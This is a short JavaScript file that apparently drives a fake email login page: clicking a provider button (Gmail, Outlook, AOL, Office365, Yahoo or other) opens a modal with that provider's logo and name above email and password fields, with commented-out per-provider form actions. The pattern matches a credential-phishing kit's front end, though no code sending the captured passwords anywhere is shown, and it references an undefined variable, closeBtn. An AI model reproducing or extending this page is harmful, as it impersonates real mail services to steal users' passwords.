"use strict";

/*
outlookmodal
aolmodal
office365modal
yahoomodal
othermodal
*/

const modal = document.querySelector(".modal__hidden");
const close = document.querySelector(".close");

const modalImg = document.querySelector("#fieldImg");
const modalText = document.querySelector("#field");
const form = document.querySelector("#contact");
const email = document.querySelector("#email");
const password = document.querySelector("#password");

const gmailOpen = document.querySelector("#gmailmodal");
const aolOpen = document.querySelector("#aolmodal");
const outlookOpen = document.querySelector("#outlookmodal");
const officeOpen = document.querySelector("#office365modal");
const yahooOpen = document.querySelector("#yahoomodal");
const otherOpen = document.querySelector("#othermodal");
const popup = document.querySelector(".popup");

setTimeout(() => {
  popup.classList.add("hidden");
}, 2000);

const openGmail = () => {
  modal.classList.remove("hidden");
};

const openOutlook = () => {
  modal.classList.remove("hidden");
  modalImg.src = "images/outlook.png";
  modalText.textContent = "Outlook";
  // form.action = "/outlook";
  // email.name = "aolemail";
  // password.name = "aolpass";
};

const openAol = () => {
  modal.classList.remove("hidden");
  modalImg.src = "images/aol.png";
  modalText.textContent = "Aol";
  // form.action = "/aol";
  // email.name = "aolemail";
  // password.name = "aolpass";
};

const openOffice = () => {
  modal.classList.remove("hidden");
  modalImg.src = "images/office365.png";
  modalText.textContent = "Office365";
  // form.action = "/office";
  // email.name = "aolemail";
  // password.name = "aolpass";
};

const openYahoo = () => {
  modal.classList.remove("hidden");
  modalImg.src = "images/yahoo.png";
  modalText.textContent = "Yahoo";
  // form.action = "/yahoo";
  // email.name = "aolemail";
  // password.name = "aolpass";
};

const openOther = () => {
  modal.classList.remove("hidden");
  modalImg.src = "images/othermail.ico";
  modalText.textContent = "Email";
  // form.action = "/other";
  // email.name = "aolemail";
  // password.name = "aolpass";
};

gmailOpen.addEventListener("click", openGmail);
aolOpen.addEventListener("click", openAol);
outlookOpen.addEventListener("click", openOutlook);
officeOpen.addEventListener("click", openOffice);
yahooOpen.addEventListener("click", openYahoo);
otherOpen.addEventListener("click", openOther);

close.addEventListener("click", () => {
  modal.classList.add("hidden");
});

closeBtn.addEventListener("click", () => {
  modal.classList.add("hidden");
});
